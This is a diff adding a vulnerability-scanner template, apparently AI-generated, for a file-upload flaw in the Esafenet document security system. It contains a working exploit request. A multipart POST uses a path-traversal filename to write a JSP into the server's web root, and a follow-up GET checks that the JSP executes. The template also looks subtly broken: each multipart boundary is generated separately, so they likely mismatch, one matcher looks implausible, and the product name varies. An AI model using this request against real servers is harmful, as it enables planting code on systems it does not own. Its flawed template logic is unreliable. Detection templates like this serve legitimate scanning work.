@@ -1,0 +1,52 @@
+id: esafenet-file-upload-vuln
+info:
+  name: Esafenet Document Security Management System File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Easyton electronic document security management system contains a file upload vulnerability allowing attackers to upload malicious files and gain control over the server.
+  tags:
+    - file-upload
+    - critical
+  reference:
+    - http://www.esafenet.com/product/277483397
+
+variables:
+  random_filename: "{{rand_text_alphanumeric(16)}}.jsp"
+  random_content: "<% out.println(\"{{rand_text_alphanumeric(16)}}\"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>"
+
+http:
+  - raw:
+      - |
+        POST /CDGServer3/fileType/importFileType.do?flag=syn_user_policy HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary={{rand_text_alphanumeric(32)}}
+
+        --{{rand_text_alphanumeric(32)}}
+        Content-Disposition: form-data; name="fileshare"; filename="/../../../webapps/ROOT/{{random_filename}}"
+
+        {{random_content}}
+        --{{rand_text_alphanumeric(32)}}--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<% out.println"
+
+  - raw:
+      - |
+        GET /{{random_filename}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "{{random_content}}"
+      - type: status
+        status:
+          - 200
